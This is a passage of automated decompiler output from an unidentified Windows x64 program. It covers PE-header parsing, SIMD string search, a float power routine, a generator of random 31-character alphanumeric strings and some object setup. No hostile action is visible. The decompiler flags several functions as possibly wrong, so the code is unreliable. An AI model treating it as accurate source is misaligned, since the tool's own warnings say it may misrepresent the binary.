__int64 __fastcall sub_13F178EBC(__int64 a1, __int64 a2, __m128i *a3)
{
  unsigned int v6; // edi
  __int64 v7; // r15
  unsigned __int8 (__fastcall *v8)(__int64, __int64, _QWORD); // rbx
  unsigned int v9; // eax
  char v11[16]; // [rsp+20h] [rbp-48h] BYREF

  v6 = 0;
  v7 = sub_13F102470(a2);
  if ( a3 )
  {
    sub_13F10A3BC((__int64)v11, 1u);
    sub_13F10A1F4(a2);
    v8 = *(unsigned __int8 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 8i64);
    v9 = sub_13F10A2BC(a3, (__int64)v11);
    if ( !v8(a1, v7, v9) )
    {
      sub_13F10A3BC((__int64)v11, 1u);
      if ( !(unsigned int)sub_13F10A2BC(a3, (__int64)v11) )
        v6 = 2;
    }
  }
  else
  {
    sub_13F10A1F4(a2);
    (**(void (__fastcall ***)(__int64, __int64))a1)(a1, v7);
  }
  sub_13F10A248(a2);
  return v6;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F178FA4) ----------------------------------------------------
char __fastcall sub_13F178FA4(__int64 a1)
{
  return sub_13F14D21C((_QWORD *)(a1 + 8));
}

//----- (000000013F178FB0) ----------------------------------------------------
__int64 __fastcall sub_13F178FB0(__int64 a1)
{
  return ((__int64 (__fastcall *)(__int64))(_security_cookie ^ 0x2CC5986BB95Ei64))(a1 + 8);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C4308: using guessed type __int64 qword_13F1C4308;

//----- (000000013F178FBC) ----------------------------------------------------
char __fastcall sub_13F178FBC(__int64 a1)
{
  return sub_13F14D2B0((_QWORD *)(a1 + 8));
}

//----- (000000013F178FE4) ----------------------------------------------------
__int64 __fastcall sub_13F178FE4()
{
  __int64 result; // rax

  result = sub_13F10AC30();
  if ( !(_DWORD)result )
    sub_13F16A158();
  return result;
}

//----- (000000013F179008) ----------------------------------------------------
__int64 __fastcall sub_13F179008()
{
  __int64 result; // rax

  result = sub_13F10AC48();
  if ( !(_DWORD)result )
    sub_13F16A158();
  return result;
}

//----- (000000013F179030) ----------------------------------------------------
bool __fastcall sub_13F179030(__int64 a1, __int64 a2, int a3)
{
  return sub_13F14D768((__int64 **)(a1 + 8), a2 + 8, a3);
}

//----- (000000013F179040) ----------------------------------------------------
bool sub_13F179040()
{
  return (unsigned int)sub_13F10AC30() != 0;
}

//----- (000000013F17905C) ----------------------------------------------------
bool sub_13F17905C()
{
  return (unsigned int)sub_13F10AC48() != 0;
}

//----- (000000013F17907C) ----------------------------------------------------
__int64 __fastcall sub_13F17907C(__int64 a1)
{
  (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 24i64))(a1);
  return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F179094) ----------------------------------------------------
__int64 __fastcall sub_13F179094(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 32i64))(a1);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1790AC) ----------------------------------------------------
__int64 __fastcall sub_13F1790AC(__int64 a1, __int64 a2)
{
  return sub_13F178EBC(a1, a2, 0i64);
}

//----- (000000013F1790B4) ----------------------------------------------------
__int64 __fastcall sub_13F1790B4()
{
  return sub_13F10AB90();
}

//----- (000000013F179140) ----------------------------------------------------
__int64 __fastcall sub_13F179140(__int64 a1, unsigned __int64 a2)
{
  unsigned int v2; // er9
  __int64 v3; // r8
  __int64 result; // rax
  unsigned __int64 v6; // rdx

  v2 = 0;
  v3 = a1 + *(int *)(a1 + 60);
  result = v3 + *(unsigned __int16 *)(v3 + 20) + 24i64;
  if ( !*(_WORD *)(v3 + 6) )
    return 0i64;
  while ( 1 )
  {
    v6 = *(unsigned int *)(result + 12);
    if ( a2 >= v6 && a2 < (unsigned int)(v6 + *(_DWORD *)(result + 8)) )
      break;
    ++v2;
    result += 40i64;
    if ( v2 >= *(unsigned __int16 *)(v3 + 6) )
      return 0i64;
  }
  return result;
}

//----- (000000013F179190) ----------------------------------------------------
__int64 __fastcall sub_13F179190(__int64 a1)
{
  __int64 result; // rax

  result = sub_13F1791E0(0x13F100000i64);
  if ( (_DWORD)result )
  {
    result = sub_13F179140(0x13F100000i64, a1 - 0x13F100000i64);
    if ( result )
      return *(int *)(result + 36) >= 0;
  }
  return result;
}

//----- (000000013F1791E0) ----------------------------------------------------
_BOOL8 __fastcall sub_13F1791E0(__int64 a1)
{
  __int64 v1; // rax
  _BOOL8 result; // rax

  result = 0;
  if ( *(_WORD *)a1 == 23117 )
  {
    v1 = a1 + *(int *)(a1 + 60);
    if ( *(_DWORD *)v1 == 17744 && *(_WORD *)(v1 + 24) == 523 )
      return 1;
  }
  return result;
}

//----- (000000013F179210) ----------------------------------------------------
__m128i *__fastcall sub_13F179210(__m128i *a1, int a2)
{
  __m128i *v2; // r8
  __m128i *v3; // r9
  const __m128i *v4; // rdx
  __int64 v5; // rax
  __m128i *v7; // rcx
  __m128i v8; // xmm0
  unsigned __int8 v9; // zf
  int v10; // ecx

  v2 = 0i64;
  v3 = a1;
  if ( a2 )
  {
    while ( ((unsigned __int8)v3 & 0xF) != 0 )
    {
      v7 = v3;
      if ( v3->m128i_i8[0] != a2 )
        v7 = v2;
      v2 = v7;
      if ( !v3->m128i_i8[0] )
        return v7;
      v3 = (__m128i *)((char *)v3 + 1);
    }
    v8 = _mm_cvtsi32_si128((unsigned __int8)a2);
    while ( 1 )
    {
      v10 = _mm_cmpistri(v8, *v3, 64);
      v9 = _mm_cmpistrz(v8, *v3, 64);
      if ( _mm_cmpistrc(v8, *v3, 64) )
      {
        v2 = (__m128i *)((char *)v3 + v10);
        v9 = _mm_cmpistrz(v8, *v3, 64);
      }
      if ( v9 )
        break;
      ++v3;
    }
    return v2;
  }
  else
  {
    v4 = (const __m128i *)((unsigned __int64)a1 & 0xFFFFFFFFFFFFFFF0ui64);
    for ( LODWORD(v5) = (-1 << ((unsigned __int8)a1 & 0xF)) & _mm_movemask_epi8(
                                                                _mm_cmpeq_epi8(
                                                                  _mm_loadu_si128((const __m128i *)((unsigned __int64)a1 & 0xFFFFFFFFFFFFFFF0ui64)),
                                                                  (__m128i)0i64));
          !(_DWORD)v5;
          LODWORD(v5) = _mm_movemask_epi8(_mm_cmpeq_epi8(_mm_loadu_si128(v4), (__m128i)0i64)) )
    {
      ++v4;
    }
    _BitScanForward((unsigned int *)&v5, v5);
    return (__m128i *)((char *)v4 + v5);
  }
}
// 13F17925E: variable 'v5' is possibly undefined
// 13F1B71A0: using guessed type int dword_13F1B71A0;

//----- (000000013F17935C) ----------------------------------------------------
__int8 *__fastcall sub_13F17935C(__int64 a1, unsigned __int8 a2)
{
  __m128i *v2; // r8
  int v3; // er10
  __int64 v4; // r9
  __m128i v5; // xmm3
  __int64 v6; // rdx
  __int8 *v7; // rdx

  v2 = (__m128i *)(a1 & 0xFFFFFFFFFFFFFFF0ui64);
  v3 = a2 | (a2 << 8);
  v4 = 0i64;
  v5 = _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_cvtsi32_si128(v3), 0), 0);
  for ( LODWORD(v6) = (-1 << (a1 & 0xF)) & _mm_movemask_epi8(
                                             _mm_or_si128(
                                               _mm_cmpeq_epi8(v5, *(__m128i *)(a1 & 0xFFFFFFFFFFFFFFF0ui64)),
                                               _mm_cmpeq_epi8((__m128i)0i64, *(__m128i *)(a1 & 0xFFFFFFFFFFFFFFF0ui64))));
        !(_DWORD)v6;
        LODWORD(v6) = _mm_movemask_epi8(_mm_or_si128(_mm_cmpeq_epi8(v5, *v2), _mm_cmpeq_epi8((__m128i)0i64, *v2))) )
  {
    ++v2;
  }
  _BitScanForward((unsigned int *)&v6, v6);
  v7 = &v2->m128i_i8[v6];
  if ( *v7 == (_BYTE)v3 )
    return v7;
  return (__int8 *)v4;
}
// 13F1793D3: variable 'v6' is possibly undefined

//----- (000000013F1793F0) ----------------------------------------------------
// local variable allocation has failed, the output may be wrong!
void __fastcall sub_13F1793F0(double _XMM0_8, double _XMM1_8, double _XMM2_8)
{
  double v4; // xmm0_8
  int v9; // er9
  unsigned int v10; // eax
  unsigned int v11; // ecx
  unsigned __int64 v16; // rcx
  bool v17; // cf
  int v86; // er10
  bool v87; // sf
  bool v88; // cc
  unsigned int v89; // ecx
  bool v99; // cc
  unsigned int v100; // ecx
  int v172; // [rsp+40h] [rbp-28h]
  int v173; // [rsp+40h] [rbp-28h]
  int v174; // [rsp+40h] [rbp-28h]
  int v175; // [rsp+50h] [rbp-18h]
  int v176; // [rsp+50h] [rbp-18h]
  int v177; // [rsp+50h] [rbp-18h]

  __asm
  {
    vpunpckldq xmm1, xmm1, xmm0
    vpxor   xmm5, xmm5, xmm5
    vmovd   eax, xmm1
    vmovd   ecx, xmm0
  }
  v9 = _ECX;
  v10 = _EAX & 0x7FFFFFFF;
  v11 = _ECX & 0x7FFFFFFF;
  if ( v10 >= 0x7F800000 )
  {
    if ( v10 <= 0x7F800000 )
    {
      if ( v11 > 0x7F800000 )
        goto LABEL_73;
      if ( v11 == 1065353216 )
      {
        _EDX = 1065353216;
        __asm
        {
          vmovd   xmm0, edx
          vmovdqa xmm7, [rsp+68h+var_38]
          vmovdqa xmm6, [rsp+68h+var_48]
        }
        return;
      }
      __asm { vmovd   eax, xmm1 }
      if ( _EAX < 0 )
      {
        _EAX = 0;
        if ( v11 < 0x3F800000 )
          _EAX = 2139095040;
        __asm
        {
          vmovd   xmm0, eax
          vmovdqa xmm7, [rsp+68h+var_38]
          vmovdqa xmm6, [rsp+68h+var_48]
        }
        return;
      }
      if ( v11 >= 0x3F800000 )
        goto LABEL_72;
      goto LABEL_71;
    }
    if ( v11 > 0x7F800000 )
    {
      if ( v9 == -4194304 )
      {
        __asm { vmovd   eax, xmm1 }
        _EAX |= 0x400000u;
        __asm { vmovd   xmm2, eax }
        sub_13F171344(*(float *)&_XMM0_8, *(float *)&_XMM1, *(double *)&_XMM2, 5u);
        __asm
        {
          vmovdqa xmm7, [rsp+68h+var_38]
          vmovdqa xmm6, [rsp+68h+var_48]
        }
      }
      else
      {
        __asm { vmovd   ecx, xmm0 }
        _ECX |= 0x400000u;
        __asm { vmovd   xmm2, ecx }
        sub_13F171344(*(float *)&_XMM0_8, *(float *)&_XMM1, *(double *)&_XMM2, 5u);
        __asm
        {
          vmovdqa xmm7, [rsp+68h+var_38]
          vmovdqa xmm6, [rsp+68h+var_48]
        }
      }
      return;
    }
    if ( v9 != 1065353216 )
    {
      __asm
      {
        vmovdqa xmm0, xmm1
        vmovd   eax, xmm1
      }
      _EAX |= 0x400000u;
      __asm { vmovd   xmm2, eax }
      sub_13F171344(*(float *)&_XMM0, *(float *)&_XMM1, *(double *)&_XMM2, 4u);
      __asm
      {
        vmovdqa xmm7, [rsp+68h+var_38]
        vmovdqa xmm6, [rsp+68h+var_48]
      }
      return;
    }
    if ( v10 < 0x7FC00000 )
    {
      _EDX = 1065353216;
      __asm { vmovd   xmm2, edx }
      sub_13F171344(*(float *)&_XMM0_8, *(float *)&_XMM1, *(double *)&_XMM2, 4u);
      __asm
      {
        vmovdqa xmm7, [rsp+68h+var_38]
        vmovdqa xmm6, [rsp+68h+var_48]
      }
      return;
    }
LABEL_69:
    _EDX = 1065353216;
    __asm
    {
      vmovd   xmm0, edx
      vmovdqa xmm7, [rsp+68h+var_38]
      vmovdqa xmm6, [rsp+68h+var_48]
    }
    return;
  }
  if ( (int)v10 > 1065353216 )
    goto LABEL_10;
  if ( !v10 )
  {
    if ( v11 > 0x7F800000 && v11 < 0x7FC00000 )
    {
      _EDX = v11 | 0x400000;
      __asm { vmovd   xmm2, edx }
      sub_13F171344(*(float *)&_XMM0_8, *(float *)&_XMM1, *(double *)&_XMM2, 3u);
      __asm
      {
        vmovdqa xmm7, [rsp+68h+var_38]
        vmovdqa xmm6, [rsp+68h+var_48]
      }
      return;
    }
    goto LABEL_69;
  }
  __asm { vmovd   edx, xmm1 }
  if ( _EDX == 1065353216 )
  {
    if ( v11 > 0x7F800000 )
    {
      __asm { vmovd   edx, xmm0 }
      _EDX |= 0x400000u;
      __asm { vmovd   xmm2, edx }
      sub_13F171344(*(float *)&_XMM0_8, *(float *)&_XMM1, *(double *)&_XMM2, 3u);
    }
    else
    {
      __asm
      {
        vmovdqa xmm7, [rsp+68h+var_38]
        vmovdqa xmm6, [rsp+68h+var_48]
      }
    }
    return;
  }
LABEL_10:
  if ( v11 >= 0x7F800000 )
  {
    __asm
    {
      vmovd   ecx, xmm0
      vmovd   edx, xmm1
    }
    if ( _ECX != 2139095040 )
    {
      if ( _ECX == -8388608 )
      {
        v99 = _EDX <= 0;
        if ( _EDX < 0 )
          _EDX = 0;
        if ( !v99 )
          _EDX = 2139095040;
        v100 = 0x80000000;
        if ( (v10 & 0x7F800000) > 0x4B000000 )
          v100 = 0;
        if ( (v10 & 0x7F800000) <= 0x4B000000 )
        {
          __asm { vstmxcsr [rsp+68h+var_28] }
          v177 = v174 | 0x1F80;
          __asm
          {
            vldmxcsr [rsp+68h+var_18]
            vcvtss2si r8d, xmm1
            vcvtsi2ss xmm2, xmm2, r8d
            vldmxcsr [rsp+68h+var_28]
            vucomiss xmm2, xmm1
          }
          v100 = 0;
        }
        _ECX = _EDX | v100;
        __asm
        {
          vmovd   xmm0, ecx
          vmovdqa xmm7, [rsp+68h+var_38]
          vmovdqa xmm6, [rsp+68h+var_48]
        }
        return;
      }
LABEL_73:
      __asm { vmovd   ecx, xmm0 }
      _ECX |= 0x400000u;
      __asm { vmovd   xmm2, ecx }
      sub_13F171344(*(float *)&_XMM0_8, *(float *)&_XMM1, *(double *)&_XMM2, 3u);
      __asm
      {
        vmovdqa xmm7, [rsp+68h+var_38]
        vmovdqa xmm6, [rsp+68h+var_48]
      }
      return;
    }
    if ( _EDX >= 0 )
    {
LABEL_72:
      _EDX = 2139095040;
      __asm
      {
        vmovd   xmm0, edx
        vmovdqa xmm7, [rsp+68h+var_38]
        vmovdqa xmm6, [rsp+68h+var_48]
      }
      return;
    }
LABEL_71:
    __asm
    {
      vpxor   xmm0, xmm0, xmm0
      vmovdqa xmm7, [rsp+68h+var_38]
      vmovdqa xmm6, [rsp+68h+var_48]
    }
    return;
  }
  __asm { vcvtps2pd xmm0, xmm1 }
  if ( v9 >= 1065877504 )
    goto LABEL_12;
  if ( v9 <= 0 )
  {
    if ( !v11 )
    {
      __asm { vmovd   edx, xmm1 }
      v86 = 0;
      v87 = _EDX < 0;
      v88 = _EDX <= 0;
      if ( _EDX < 0 )
        _EDX = 2139095040;
      if ( v87 )
        v86 = 2139095040;
      if ( !v88 )
        _EDX = 0;
      v89 = 0x80000000;
      if ( (v10 & 0x7F800000) > 0x4B000000 )
        v89 = 0;
      if ( (v10 & 0x7F800000) <= 0x4B000000 )
      {
        __asm { vstmxcsr [rsp+68h+var_28] }
        v176 = v173 | 0x1F80;
        __asm
        {
          vldmxcsr [rsp+68h+var_18]
          vcvtss2si r8d, xmm1
          vcvtsi2ss xmm2, xmm2, r8d
          vldmxcsr [rsp+68h+var_28]
          vucomiss xmm2, xmm1
        }
        v89 = 0;
      }
      _ECX = _EDX | v89;
      __asm { vmovd   xmm0, ecx }
      if ( v86 )
      {
        __asm { vmovdqa xmm2, xmm0 }
        sub_13F171344(*(float *)&_XMM0, *(float *)&_XMM1, *(double *)&_XMM2, 2u);
        __asm
        {
          vmovdqa xmm7, [rsp+68h+var_38]
          vmovdqa xmm6, [rsp+68h+var_48]
        }
      }
      return;
    }
    if ( (v10 & 0x7F800000) <= 0x4B000000 )
    {
      __asm { vstmxcsr [rsp+68h+var_28] }
      v175 = v172 | 0x1F80;
      __asm
      {
        vldmxcsr [rsp+68h+var_18]
        vcvtss2si edx, xmm1
        vcvtsi2ss xmm2, xmm2, edx
        vldmxcsr [rsp+68h+var_28]
        vucomiss xmm2, xmm1
      }
      _EDX = -4194304;
      __asm { vmovd   xmm2, edx }
      sub_13F171344(*(float *)&_XMM0, *(float *)&_XMM1, *(double *)&_XMM2, 6u);
      __asm
      {
        vmovdqa xmm7, [rsp+68h+var_38]
        vmovdqa xmm6, [rsp+68h+var_48]
      }
      return;
    }
  }
  __asm
  {
    vpshufd xmm3, xmm0, 0EEh ; ''
    vsubsd  xmm3, xmm3, cs:qword_13F19AB4C
    vmovq   rdx, xmm3
  }
  if ( (_RDX & 0x7FFFFFFFFFFFFFFFui64) >= 0x3FB0000000000000i64 )
  {
LABEL_12:
    __asm
    {
      vpshufd xmm2, xmm0, 0EEh ; ''
      vpand   xmm2, xmm2, cs:xmmword_13F19ABD0
      vmovq   rcx, xmm2
    }
    v16 = (__CFSHR__(_RCX, 44) + (_RCX >> 44)) | 0x3FE00;
    v17 = __CFSHL__(v16, 44);
    _RCX = v16 << 44;
    __asm
    {
      vmovq   xmm1, rcx
      vpor    xmm2, xmm2, cs:xmmword_13F19ABB0
      vpshufd xmm3, xmm2, 0EEh ; ''
      vpsrlq  xmm3, xmm3, 34h ; '4'
      vpsubq  xmm3, xmm3, cs:xmmword_13F19ABC0
      vcvtdq2pd xmm3, xmm3
      vsubsd  xmm1, xmm1, xmm2
      vmulsd  xmm1, xmm1, qword ptr [rcx+rax*8]
      vmovapd xmm2, xmm1
      vmovsd  xmm4, cs:qword_13F19AB14
      vfmadd213sd xmm4, xmm1, qword ptr cs:xmmword_13F19ABB0
      vfmadd213sd xmm4, xmm1, cs:qword_13F19AB4C
      vmulsd  xmm1, xmm1, xmm4
      vmulsd  xmm3, xmm3, cs:qword_13F19AB1C
      vaddsd  xmm3, xmm3, qword ptr [rcx+rax*8]
      vsubsd  xmm3, xmm3, xmm1
      vmulsd  xmm0, xmm0, xmm3
      vucomisd xmm0, cs:qword_13F19AB24
    }
    if ( v17 || _RCX == 0 )
    {
      __asm { vucomisd xmm0, cs:qword_13F19AB2C }
      if ( v17 || _RCX == 0 )
      {
        __asm
        {
          vpxor   xmm2, xmm2, xmm2
          vorps   xmm2, xmm2, xmm5
        }
        sub_13F171344(*(float *)&_XMM0, *(float *)&_XMM1, *(double *)&_XMM2, 7u);
        __asm
        {
          vmovdqa xmm7, [rsp+68h+var_38]
          vmovdqa xmm6, [rsp+68h+var_48]
        }
      }
      else
      {
        __asm
        {
          vmulpd  xmm3, xmm0, cs:xmmword_13F19ABA0
          vcvtpd2dq xmm4, xmm3
          vcvtdq2pd xmm2, xmm4
          vmovd   ecx, xmm4
          vfnmadd231sd xmm0, xmm2, cs:qword_13F19AB34
          vmovapd xmm1, xmm0
          vmovsd  xmm3, cs:qword_13F19AB3C
          vfmadd213sd xmm3, xmm0, qword ptr cs:xmmword_13F19ABB0
          vfmadd213sd xmm3, xmm0, cs:qword_13F19AB4C
          vmulsd  xmm0, xmm0, xmm3
        }
        _RAX = _ECX & 0x3F;
        _RCX = qword_13F1922E0;
        __asm
        {
          vmovsd  xmm3, qword ptr [rcx+rax*8]
          vfmadd213sd xmm0, xmm3, xmm3
          vpsrad  xmm4, xmm4, 6
          vpsllq  xmm4, xmm4, 34h ; '4'
          vpaddq  xmm4, xmm4, xmm0
          vcvtsd2ss xmm0, xmm0, xmm4
          vorps   xmm0, xmm0, xmm5
          vmovdqa xmm7, [rsp+68h+var_38]
          vmovdqa xmm6, [rsp+68h+var_48]
        }
      }
    }
    else
    {
      _EDX = 2139095040;
      __asm
      {
        vmovd   xmm2, edx
        vorps   xmm2, xmm2, xmm5
      }
      sub_13F171344(*(float *)&_XMM0, *(float *)&_XMM1, *(double *)&_XMM2, 9u);
      __asm
      {
        vmovdqa xmm7, [rsp+68h+var_38]
        vmovdqa xmm6, [rsp+68h+var_48]
      }
    }
    return;
  }
  __asm
  {
    vpshufd xmm5, xmm5, 44h ; 'D'
    vmovapd xmm1, xmm3
    vmovsd  xmm5, xmm5, xmm3
    vaddsd  xmm1, xmm1, cs:qword_13F19AB54
    vdivsd  xmm5, xmm5, xmm1
    vmovapd xmm2, xmm5
    vmulsd  xmm5, xmm5, xmm3
    vaddsd  xmm2, xmm2, xmm2
    vmovapd xmm1, xmm2
    vmulsd  xmm1, xmm1, xmm2
    vpshufd xmm4, xmm1, 44h ; 'D'
    vmulpd  xmm4, xmm4, cs:xmmword_13F19AB70
    vmulsd  xmm2, xmm2, xmm1
    vaddpd  xmm4, xmm4, cs:xmmword_13F19AB80
    vmulsd  xmm1, xmm1, xmm1
    vmulsd  xmm1, xmm1, xmm2
    vunpcklpd xmm2, xmm2, xmm1
    vmulpd  xmm2, xmm2, xmm4
    vpshufd xmm1, xmm2, 0EEh ; ''
    vaddsd  xmm2, xmm1, xmm2
    vsubsd  xmm2, xmm2, xmm5
    vpshufd xmm5, xmm5, 0EEh ; ''
    vaddsd  xmm3, xmm3, xmm2
  }
  v4 = *(double *)&_XMM0 * *(double *)&_XMM3;
  if ( v4 > 88.72283935546875 )
  {
    sub_13F171344(
      *(float *)&v4,
      *(float *)&_XMM1,
      COERCE_DOUBLE(_mm_cvtsi32_si128(0x7F800000u).m128i_u64[0] | _XMM5),
      9u);
  }
  else if ( v4 <= -103.2789306640625 )
  {
    sub_13F171344(*(float *)&v4, *(float *)&_XMM1, *(double *)&_XMM5, 7u);
  }
}
// 13F179EA3: conditional instruction was optimized away because eax.4 is in (1..7F7FFFFF)
// 13F1793F0: inconsistent variable size for 'xmm0_8.8(_XMM0_8)'
// 13F1793F0: inconsistent variable size for 'xmm1_8.8(_XMM1_8)'
// 13F1793F0: inconsistent variable size for 'xmm2_8.8(_XMM2_8)'
// 13F1922E0: using guessed type __int64 qword_13F1922E0[64];
// 13F1C6A40: using guessed type int dword_13F1C6A40;

//----- (000000013F17A2B8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F17A2B8()
{
  __int64 result; // rax

  dword_13F1C7000 = 28800;
  off_13F1C7010 = (__int64 (*(*)[2])[8])off_13F1B7C70;
  result = 0i64;
  dword_13F1C7004 = 1;
  dword_13F1C7008 = -3600;
  return result;
}
// 13F17A2BF: write access to const memory at 13F1C7000 has been detected
// 13F17A2C9: write access to const memory at 13F1C7010 has been detected
// 13F17A2D2: write access to const memory at 13F1C7004 has been detected
// 13F17A2DC: write access to const memory at 13F1C7008 has been detected
// 13F17A2B8: using guessed type __int64 __fastcall sub_13F17A2B8();
// 13F1B7C70: using guessed type __int64 (*off_13F1B7C70[2])[8];
// 13F1C7000: using guessed type int dword_13F1C7000;
// 13F1C7004: using guessed type int dword_13F1C7004;
// 13F1C7008: using guessed type int dword_13F1C7008;
// 13F1C7010: using guessed type __int64 (*(*off_13F1C7010)[2])[8];

//----- (000000013F17A2F0) ----------------------------------------------------
__int64 __fastcall sub_13F17A2F0(__int64 a1, __int64 a2, unsigned int a3)
{
  _QWORD *v5; // rax
  __int64 v6; // r9
  _QWORD *v8; // [rsp+48h] [rbp-B0h]
  _QWORD *v9; // [rsp+50h] [rbp-A8h]
  __int64 v10[3]; // [rsp+60h] [rbp-98h] BYREF
  void (__fastcall ***v11)(_QWORD, __int64); // [rsp+78h] [rbp-80h]

  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)(a1 + 24) = 15i64;
  *(_BYTE *)a1 = 0;
  sub_13F15EF70((__int64)v10, 0, 0x70ui64);
  v8 = (_QWORD *)sub_13F14059C(152i64);
  sub_13F15EF70((__int64)v8, 0, 0x98ui64);
  v9 = (_QWORD *)sub_13F14059C(32i64);
  *v9 = 0i64;
  v9[1] = 0i64;
  v9[2] = 0i64;
  v9[3] = 0i64;
  sub_13F10EE30((__int64)v9, 0);
  *v9 = off_13F1884F0;
  v9[1] = off_13F188660;
  v9[3] = a1;
  v5 = sub_13F103C80(v8, (__int64)v9);
  sub_13F103340((__int64)v10, (__int64)qword_13F1C9100, a3, v6, (__int64)v5);
  v10[0] = (__int64)off_13F188680;
  v10[1] = (__int64)off_13F188828;
  if ( v11 )
    (**v11)(v11, 1i64);
  return a1;
}
// 13F17A3DE: variable 'v6' is possibly undefined
// 13F1884F0: using guessed type __int64 (__fastcall *off_13F1884F0[46])();
// 13F188660: using guessed type void *off_13F188660[4];
// 13F188680: using guessed type __int64 (__fastcall *off_13F188680[53])();
// 13F188828: using guessed type void *off_13F188828[4];
// 13F1C9100: using guessed type __int64 qword_13F1C9100[513];

//----- (000000013F17A440) ----------------------------------------------------
__int64 __fastcall sub_13F17A440(__int64 a1, __int64 a2)
{
  int v3; // eax
  __int64 i; // rbx
  int v5; // ecx
  int v6; // ecx
  char v7; // r8

  v3 = sub_13F169E64(0i64);
  sub_13F167ED4(v3);
  for ( i = 0i64; i < 31; ++i )
  {
    v5 = (int)sub_13F167EA8() % 3;
    if ( v5 )
    {
      v6 = v5 - 1;
      if ( v6 )
      {
        if ( v6 == 1 )
          v7 = (int)sub_13F167EA8() % 10 + 48;
        else
          v7 = 0;
      }
      else
      {
        v7 = (int)sub_13F167EA8() % 26 + 97;
      }
    }
    else
    {
      v7 = (int)sub_13F167EA8() % 26 + 65;
    }
    *(_BYTE *)(i + a2) = v7;
  }
  return 0i64;
}

//----- (000000013F17A530) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F17A530()
{
  unsigned __int64 v0; // rcx
  __int64 v1; // rdx
  __int64 (__fastcall *v2)(__int64); // rdx
  __int64 (__fastcall *v3)(__int64); // rdx
  _QWORD *v4; // rax
  __int64 v5; // rcx
  __int64 v6; // rdi
  __int64 v7; // rax
  __int64 (__fastcall *v8)(__int64); // rdx
  __int64 (__fastcall *v9)(__int64); // rdx
  __int64 *v10; // rax
  char *v11; // rcx
  unsigned __int64 v12; // rcx
  __int64 result; // rax
  unsigned __int64 v14; // rcx
  char v15; // [rsp+28h] [rbp-E0h]
  int v16; // [rsp+28h] [rbp-E0h]
  char v17[16]; // [rsp+40h] [rbp-C8h] BYREF
  unsigned __int64 v18; // [rsp+50h] [rbp-B8h]
  unsigned __int64 v19; // [rsp+58h] [rbp-B0h]
  void *v20; // [rsp+60h] [rbp-A8h]
  __int64 (__fastcall **v21)(); // [rsp+70h] [rbp-98h] BYREF
  void **v22; // [rsp+78h] [rbp-90h]
  __int64 v23; // [rsp+80h] [rbp-88h]
  __int64 *v24; // [rsp+88h] [rbp-80h]
  __int64 v25; // [rsp+90h] [rbp-78h]
  __int64 v26; // [rsp+98h] [rbp-70h]
  __int64 (__fastcall **v27)(); // [rsp+A0h] [rbp-68h] BYREF
  void **v28; // [rsp+A8h] [rbp-60h]
  __int64 v29; // [rsp+B0h] [rbp-58h]
  __int64 *v30; // [rsp+B8h] [rbp-50h]
  __int64 v31; // [rsp+C0h] [rbp-48h]
  __int64 v32; // [rsp+C8h] [rbp-40h]
  char v33[40]; // [rsp+D0h] [rbp-38h] BYREF
  unsigned __int64 v34; // [rsp+F8h] [rbp-10h]
  unsigned __int64 v35; // [rsp+100h] [rbp-8h]
  void *v36[7]; // [rsp+108h] [rbp+0h] BYREF
  unsigned __int64 v37; // [rsp+140h] [rbp+38h]
  unsigned __int64 v38; // [rsp+148h] [rbp+40h]
  char *v39; // [rsp+150h] [rbp+48h]
  void (__fastcall ***v40)(_QWORD, __int64); // [rsp+158h] [rbp+50h]
  __int64 v41; // [rsp+168h] [rbp+60h] BYREF
  __int64 v42; // [rsp+170h] [rbp+68h] BYREF
  __int64 v43; // [rsp+180h] [rbp+78h] BYREF
  __int64 v44[15]; // [rsp+190h] [rbp+88h] BYREF
  __int64 v45; // [rsp+208h] [rbp+100h] BYREF
  __int64 v46[2]; // [rsp+210h] [rbp+108h] BYREF
  __int64 v47[17]; // [rsp+220h] [rbp+118h] BYREF
  _QWORD v48[50]; // [rsp+2A8h] [rbp+1A0h] BYREF

  sub_13F15EF70((__int64)v33, 0, 0x98ui64);
  sub_13F132C90((__int64)v33);
  sub_13F133210((__int64)v33, 0i64, 0i64);
  sub_13F15EF70((__int64)&v45, 0, 0x228ui64);
  sub_13F1055F0(&v45);
  sub_13F112AD0((__int64)v17, 0x11u);
  sub_13F127220((__int64)v47, (__int64)v33, 4096, (__int64)v17);
  v0 = v19;
  if ( v18 < v19 )
    v0 = v18;
  v1 = (__int64)v20;
  if ( v20 )
  {
    memset(v20, 0, 8 * v0);
    sub_13F12E4D0(v1);
  }
  v27 = 0i64;
  v28 = 0i64;
  v29 = 0i64;
  v30 = 0i64;
  v31 = 0i64;
  v32 = 0i64;
  sub_13F10EE30((__int64)&v27, 0);
  v27 = off_13F182988;
  v28 = off_13F182AF8;
  v30 = qword_13F1C8100;
  v31 = 2373i64;
  v32 = 0i64;
  v2 = *(__int64 (__fastcall **)(__int64))(v46[0] + 48);
  if ( v2 == sub_13F104290 )
  {
    v3 = *(__int64 (__fastcall **)(__int64))(v45 + 72);
    if ( v3 == sub_13F104200 )
      v4 = v48;
    else
      v4 = (_QWORD *)(v3((__int64)&v45) + 136);
  }
  else
  {
    v4 = (_QWORD *)v2((__int64)v46);
  }
  v5 = (__int64)v4 + *(int *)(v4[1] + 4i64) + 8;
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)()))(*(_QWORD *)v5 + 40i64))(v5, &v27);
  v15 = 1;
  ((void (__fastcall *)(__int64 (__fastcall ***)(), _QWORD, _QWORD, __int64, char))v27[6])(
    &v27,
    0i64,
    0i64,
    0xFFFFFFFFi64,
    v15);
  qword_13F1B7C88 = v32;
  sub_13F15EF70((__int64)&v41, 0, 0x98ui64);
  sub_13F105500(&v41);
  v6 = *(__int64 *)((char *)v44 + *(int *)(v44[0] + 4));
